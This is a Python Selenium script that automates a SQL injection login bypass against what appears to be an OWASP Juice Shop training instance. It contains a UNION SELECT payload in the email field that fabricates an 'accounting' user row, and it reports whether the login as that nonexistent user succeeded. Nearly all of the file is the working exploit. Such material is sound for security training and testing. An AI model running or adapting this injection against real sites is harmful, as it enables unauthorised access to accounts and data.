from pyvirtualdisplay import Display
from selenium.webdriver.chrome.options import Options

from userAction import User


class NonExistingUser:

    def __init__(self, url):
        attack_vector = ("' UNION SELECT * FROM (SELECT "
                         "15 as 'id', '' as 'username', '"
                         "acc0unt4nt@juice-sh.op' as '"
                         "email', '12345' as 'password',"
                         " 'accounting' as 'role', '123"
                         "' as 'deluxeToken', '1.2.3.4' "
                         "as 'lastLoginIp' , '/assets/"
                         "public/images/uploads/default"
                         ".svg' as 'profileImage', '' as"
                         " 'totpSecret', 1 as 'isActive',"
                         " '1999-08-16 14:14:41.644 +00:00'"
                         " as 'createdAt', '1999-08-16 14:33"
                         ":41.930 +00:00' as 'updatedAt',"
                         " null as 'deletedAt')--")
        # Virtual display to run chrome-browser
        display = Display(visible=0, size=(1920, 1080))
        display.start()
        # Headless chrome-browser settings
        chrome_options = Options()
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--disable-dev-shm-usage')
        self.user = User(url=url,
                         email=attack_vector,
                         password=" ",
                         user_number=1,
                         chrome_options=chrome_options)

    def run(self):
        logged_in = self.user.login()
        if logged_in:
            print("Logged in as nonexisting user. Attack successful")
        else:
            print("Attack didnt work")
